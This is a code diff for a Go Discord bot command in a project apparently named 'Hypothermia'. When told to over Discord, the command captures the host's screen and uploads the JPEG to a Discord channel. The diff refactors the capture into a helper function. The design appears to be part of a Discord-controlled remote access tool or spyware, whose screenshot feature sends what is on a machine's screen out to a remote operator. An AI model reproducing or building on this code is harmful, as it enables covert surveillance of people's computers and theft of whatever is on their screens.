@@ -1,11 +1,9 @@
 package commands
 
 import (
-	"bytes"
-	"image/jpeg"
+	"Hypothermia/src/funcs"
 
 	"github.com/bwmarrin/discordgo"
-	"github.com/vova616/screenshot"
 )
 
 const (
@@ -14,15 +12,13 @@ const (
 )
 
 func (*ScreenShotCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
-	img, err := screenshot.CaptureScreen()
-	if err != nil {
+	buf, err := funcs.Screenshot()
+	switch err {
+	case -2:
 		s.ChannelMessageSendReply(m.ChannelID, ssCaptureError, m.Reference())
 		return
-	}
 
-	var buf bytes.Buffer
-	err = jpeg.Encode(&buf, img, nil)
-	if err != nil {
+	case -1:
 		s.ChannelMessageSendReply(m.ChannelID, ssEncodingError, m.Reference())
 		return
 	}
@@ -31,7 +27,7 @@ func (*ScreenShotCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, 
 		Reference: m.Reference(),
 		Files: []*discordgo.File{{
 			Name:   "ss.jpg",
-			Reader: &buf,
+			Reader: buf,
 		}},
 	})
 }
